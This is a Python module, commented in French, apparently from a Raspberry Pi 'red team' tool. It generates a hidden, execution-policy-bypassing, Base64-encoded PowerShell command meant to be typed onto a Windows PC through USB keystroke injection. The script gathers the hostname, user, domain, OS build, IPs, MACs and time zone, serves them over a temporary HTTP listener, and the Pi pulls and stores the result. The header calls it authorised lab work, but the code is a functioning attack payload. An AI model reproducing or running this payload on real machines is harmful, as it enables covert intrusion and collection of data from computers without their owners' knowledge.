#!/usr/bin/env python3
"""
profiler/system_profiler.py
----------------------------
Collecte les métadonnées système du PC cible connecté au Pi via USB Gadget.

Deux responsabilités :
  1. build_payload()            → construit la commande PowerShell (str encodée)
  2. collect_system_profile()   → récupère le JSON via HTTP, retourne un dict

Version corrigée pour exécution via HID (Win+R → PowerShell encodé en Base64).

Projet cybersécurité — Lab Red Team / Blue Team — env. contrôlé et autorisé.
Compatible Python 3 natif — aucune dépendance externe.
"""

import json
import socket
import time
import urllib.request
import urllib.error
import base64
from datetime import datetime, timezone
from pathlib import Path


# ---------------------------------------------------------------------------
# 1. Construction du payload PowerShell (version encodée pour HID)
# ---------------------------------------------------------------------------

def _build_ps_script(http_port: int = 8888) -> str:
    """
    Retourne le script PowerShell embarqué (sans l'enveloppe powershell.exe).
    
    Collecte :
      - Hostname, utilisateur, domaine
      - OS, version, build, architecture, uptime
      - Interfaces réseau, IP, MAC, gateway
      - Fuseau horaire, heure locale, heure UTC
      - Démarre un serveur HTTP temporaire sur http_port
    """
    return (
        # Système
        "$s=@{};"
        "$s.hostname=$env:COMPUTERNAME;"
        "$s.user=$env:USERNAME;"
        "$s.domain=$env:USERDOMAIN;"
        "$o=Get-WmiObject Win32_OperatingSystem;"
        "$s.os=$o.Caption;"
        "$s.version=$o.Version;"
        "$s.build=$o.BuildNumber;"
        "$s.arch=$o.OSArchitecture;"
        "$up=(Get-Date)-$o.ConvertToDateTime($o.LastBootUpTime);"
        "$s.uptime=[string]$up.Days+'d '+[string]$up.Hours+'h '+[string]$up.Minutes+'m';"
        # Réseau
        "$n=@{};"
        "$a=Get-WmiObject Win32_NetworkAdapterConfiguration|?{$_.IPEnabled};"
        "$n.local_ip=($a|?{$_.DefaultIPGateway}|select -First 1).IPAddress[0];"
        "$n.interfaces=@($a|%{"
            "@{name=$_.Description;"
            "ip=if($_.IPAddress){$_.IPAddress[0]}else{'n/a'};"
            "mac=$_.MACAddress;"
            "gateway=if($_.DefaultIPGateway){$_.DefaultIPGateway[0]}else{'n/a'}}});"
        # Temps
        "$tz=[TimeZoneInfo]::Local;"
        "$t=@{"
            "timezone=$tz.Id;"
            "tz_name=$tz.DisplayName;"
            "local=(Get-Date).ToString('o');"
            "utc=(Get-Date).ToUniversalTime().ToString('o')};"
        # JSON
        "$r=@{"
            "module='profiler';"
            "timestamp=(Get-Date).ToUniversalTime().ToString('o');"
            "status='ok';"
            "system=$s;"
            "network=$n;"
            "time=$t}"
        "|ConvertTo-Json -Depth 10;"
        # Serveur HTTP temporaire
        "$l=New-Object Net.HttpListener;"
        f"$l.Prefixes.Add('http://+:{http_port}/');"
        "$l.Start();"
        "$c=$l.GetContext();"
        "$b=[Text.Encoding]::UTF8.GetBytes($r);"
        "$c.Response.ContentType='application/json';"
        "$c.Response.ContentLength64=$b.Length;"
        "$c.Response.OutputStream.Write($b,0,$b.Length);"
        "$c.Response.OutputStream.Close();"
        "$l.Stop()"
    )


def build_payload(http_port: int = 8888, use_encoded: bool = True) -> str:
    """
    Construit la commande PowerShell à exécuter sur la cible Windows.
    
    Deux modes :
      - encoded=True  (par défaut) → PowerShell encodé en Base64 (passe par Win+R)
      - encoded=False → commande en clair (limitée à ~260 caractères)
    
    Le script PowerShell :
      1. Collecte les infos système
      2. Démarre un serveur HTTP temporaire
      3. Attend la connexion du Raspberry
      4. Renvoie le JSON et s'arrête
    
    Retourne une chaîne str prête à être passée à type_payload() ou execute_in_ps().
    
    Usage dans main.py ou agent.py :
        from profiler.system_profiler import build_payload
        command = build_payload(http_port=8888)
    """
    if use_encoded:
        # Encodage Base64 (UTF-16LE) — passe dans Win+R sans limite de taille
        ps_script = _build_ps_script(http_port)
        encoded = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
        return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
    else:
        # Version en clair (limitée)
        return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{_build_ps_script(http_port)}"'


# ---------------------------------------------------------------------------
# 2. Récupération HTTP du profil
# ---------------------------------------------------------------------------

def _http_get(url: str, timeout: int = 5) -> str | None:
    """GET HTTP simple via urllib (stdlib — aucune dépendance externe)."""
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.read().decode("utf-8")
    except urllib.error.URLError as e:
        print(f"[profiler] HTTP erreur : {e.reason}")
        return None
    except socket.timeout:
        print("[profiler] HTTP timeout")
        return None
    except Exception as e:
        print(f"[profiler] Erreur : {e}")
        return None


def _save(profile: dict, output_dir: str) -> None:
    """Sauvegarde le profil JSON sur le Pi."""
    try:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d_%H-%M-%S")
        f  = out / f"profile_{ts}.json"
        f.write_text(json.dumps(profile, indent=2, ensure_ascii=False), encoding="utf-8")
        print(f"[profiler] Sauvegardé → {f}")
    except Exception as e:
        print(f"[profiler] Erreur sauvegarde : {e}")


def collect_system_profile(
    target_ip:   str  = "192.168.7.1",
    http_port:   int  = 8888,
    output_dir:  str  = "/opt/redteam_tool/reports",
    export_json: bool = True,
    retries:     int  = 3,
    retry_delay: int  = 2,
) -> dict | None:
    """
    Récupère le profil JSON du PC cible via HTTP et retourne un dict.

    Après avoir exécuté le payload HID sur la cible (qui démarre un serveur
    HTTP temporaire), cette fonction interroge ce serveur pour récupérer
    les données.

    Paramètres
    ----------
    target_ip   : IP du PC sur usb0 — vérifier avec `ip route show dev usb0`
    http_port   : port du serveur HTTP PowerShell (défaut : 8888)
    output_dir  : dossier de sauvegarde du JSON sur le Pi
    export_json : si True, sauvegarde le JSON localement
    retries     : tentatives HTTP avant abandon
    retry_delay : secondes entre tentatives

    Retourne le profil (dict) ou None si échec.

    Usage dans main.py ou agent.py :
        from profiler.system_profiler import collect_system_profile
        profile = collect_system_profile(target_ip="192.168.7.1")
    """
    url = f"http://{target_ip}:{http_port}/"
    print(f"[profiler] Récupération → {url}")

    raw = None
    for i in range(1, retries + 1):
        print(f"[profiler] Tentative {i}/{retries}...")
        raw = _http_get(url)
        if raw:
            break
        if i < retries:
            time.sleep(retry_delay)

    if not raw:
        print("[profiler] Échec — aucune réponse du PC cible.")
        return None

    try:
        profile = json.loads(raw)
    except json.JSONDecodeError as e:
        print(f"[profiler] JSON invalide : {e}")
        return None

    print("[profiler] Profil reçu.")

    if export_json:
        _save(profile, output_dir)

    return profile
